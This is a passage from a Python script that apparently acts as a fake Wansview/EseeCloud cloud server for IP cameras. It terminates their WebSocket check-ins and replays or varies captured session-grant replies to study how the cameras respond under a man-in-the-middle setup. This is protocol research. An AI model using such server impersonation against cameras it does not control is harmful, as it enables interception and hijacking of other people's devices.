                                        pconv = struct.unpack("<I", payload[16:20])[0]
                                        nxt = struct.unpack("<I", reply[32:36])[0]
                                        self.granted_next_by_pconv[(pconv, payload[4])] = nxt
                                        self.granted_pconvs.add(pconv)
                                    except (struct.error, IndexError):
                                        pass
                                try:
                                    writer.write(build_ws_frame(0x2, reply))
                                    await writer.drain()
                                    variant = (f" variant={GRANT_VARIANTS[(replay._variant_index - 1) % len(GRANT_VARIANTS)]}"
                                               if self.reply_mode == "rotate" else "")
                                    print(f"  [WS :{port}] -> {src} REPLIED "
                                          f"mode={self.reply_mode}{variant} "
                                          f"len={len(reply)} hex={reply.hex()}")
                                    self._log(port, src,
                                              f"REPLY mode={self.reply_mode}{variant} "
                                              f"len={len(reply)} hex={reply.hex()}")
                                except Exception:
                                    pass
                        elif (not replied and self.reply_mode
                                and opcode in (0x2, 0x1)):
                            reply = build_hello_reply(payload, self.reply_mode,
                                                      self.custom_hex)
                            if reply is not None:
                                try:
                                    # Server->client frames are unmasked; 0x82 is
                                    # a binary frame matching the observed family.
                                    writer.write(build_ws_frame(0x2, reply))
                                    await writer.drain()
                                    replied = True
                                    print(f"  [WS :{port}] -> {src} REPLIED "
                                          f"mode={self.reply_mode} "
                                          f"len={len(reply)} hex={reply.hex()}")
                                    self._log(port, src,
                                              f"REPLY mode={self.reply_mode} "
                                              f"len={len(reply)} hex={reply.hex()}")
                                except Exception:
                                    pass
                            elif not hello_miss_logged:
                                hello_miss_logged = True
                                print(f"  [WS :{port}] {src} first data frame not "
                                      f"a hello (len={len(payload)}) — no reply "
                                      f"(mode={self.reply_mode})")
                    # Optional keepalive (off by default). The camera sends its
                    # first frame then waits ~10s for a server reply; sending a
                    # passive empty BINARY frame (0x82, matching the observed
                    # binary protocol family) prompts the full check-in sequence.
                    # Disabled in replay mode: the state machine already answers
                    # every frame, and injected empty frames would be noise the
                    # camera may misparse (the real server sent only ack+grant).
                    if self.keepalive and self.reply_mode != "replay":
                        try:
                            writer.write(build_ws_frame(0x2, b""))
                            await writer.drain()
                        except Exception:
                            pass
                # All buffered frames consumed (or a partial frame is pending).
                # Wait for the next chunk; if the camera is waiting for OUR
                # reply, the next read blocks until it sends more (or times out
                # after 60s of silence).
                try:
                    chunk = await asyncio.wait_for(reader.read(65536), timeout=60.0)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                buf += chunk
        except (asyncio.IncompleteReadError, ConnectionError, OSError) as e:
            print(f"  [WS :{port}] {src} error: {type(e).__name__}: {e}")
        finally:
            self._log(port, src, f"DISCONNECT {src}")
            try:
                writer.close()
                await writer.wait_closed()
            except OSError:
                pass


async def main_async(args):
    os.makedirs(args.log_dir, exist_ok=True)
    print("=" * 60)
    print("  EseeCloud/Wansview WebSocket-terminating fake server")
    print("=" * 60)
    print(f"  Ports:   {args.ports}")
    print(f"  Log dir: {args.log_dir}")
    print("=" * 60)
    server = WsCaptureServer(args.ports, args.log_dir, keepalive=args.keepalive,
                             reply_mode=args.reply_mode, custom_hex=args.reply_hex,
                             next_counter_mode=args.next_counter,
                             lite_cadence=(args.lite_cadence or None))
    await server.start()
    print()
    print("  WebSocket servers up. Waiting for camera Upgrade requests...")
    if args.reply_mode:
        print(f"  Reply mode: {args.reply_mode}")
        if args.reply_mode == "replay":
            print("  Replay engine: cefaeffe hello -> ack, abbccdde 11 "
                  "registration -> abbccdde 12 session grant "
                  f"(next-counter mode: {args.next_counter})")
        if args.reply_mode == "rotate":
            print("  Rotate engine: replay state machine cycling grant variants "
                  "cadence -> plus1 -> badoffset -> magic -> echo -> empty "
                  "per registration (hour-long gate-flip measurement)")
        if args.reply_hex:
            print(f"  Custom reply hex: {args.reply_hex}")
    try:
        while True:
            await asyncio.sleep(3600)
    except asyncio.CancelledError:
        pass
    finally:
        server.stop()


def main():
    parser = argparse.ArgumentParser(
        description="WebSocket-terminating fake Wansview/EseeCloud server"
    )
    parser.add_argument("--ports", type=int, nargs="+", required=True,
                        help="TCP ports to WebSocket-terminate (e.g. 19000)")
    parser.add_argument("--log-dir", required=True, help="Output directory")
    parser.add_argument("--keepalive", action="store_true",
                        help="Send an empty BINARY frame after each data frame "
                             "to prompt the camera's full check-in sequence "
                             "(off by default)")
    parser.add_argument("--reply-mode", choices=["echo", "magic", "echo-plus",
                                                 "custom", "replay", "rotate"], default="",
                        help="Answer the camera's check-in frames (echo / magic / "
                             "echo-plus / custom = one-shot candidate replies; "
                             "replay = per-frame state machine reproducing the "
                             "captured real cloud server: hello->ack, "
                             "registration->session grant; rotate = replay but "
                             "cycling GRANT_VARIANTS cadence->plus1->badoffset->"
                             "magic->echo->empty per registration for the hour-long "
                             "gate-flip measurement)")
    parser.add_argument("--reply-hex", default="",
                        help="Exact hex reply payload used by --reply-mode custom")
    parser.add_argument("--next-counter", choices=["cadence", "plus1"],
                        default="cadence",
                        help="How the replay computes the grant's next-counter: "
                             "cadence = mirror the real server's ~0x13A0 per "
                             "check-in jump (camera adopts these; default), "
                             "plus1 = legacy counter+1 (never adopted under "
                             "MITM — kept for A/B comparison)")
    parser.add_argument("--lite-cadence", type=lambda s: int(s, 0),
                        default=0x1E,
                        help="Counter advance granted to LITE 0x00 keepalives. "
                             "The camera's NATURAL cadence is +0x14 per 20 s "
                             "(T030607Z), so this MUST differ from 0x14 (e.g. "
                             "0x1E) for the ADOPTED signal to be meaningful: "
                             "if the camera adopts our granted next its next "
                             "LITE counter equals counter+<this>; if it keeps "
                             "its own cadence it stays +0x14. Pass 0 to keep "
                             "legacy behavior (FULL pconv cadence).")
    parser.add_argument("--lite-monitor", action="store_true",
                        help="Log each camera's observed LITE 0x00 counter "
                             "delta (LITE_DELTA — natural +0x14 vs our granted "
                             "lite-cadence) and flag the moment a FULL 0x11 "
                             "registration arrives after we granted that camera "
                             "(FULL_ESCALATION — the adoption precondition "
                             "that previously required a power-cycle to "
                             "observe). The mitm script passes this by default "
                             "and auto-extends the run on first escalation.")
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n  Interrupted. Shutting down...")


if __name__ == "__main__":
    main()
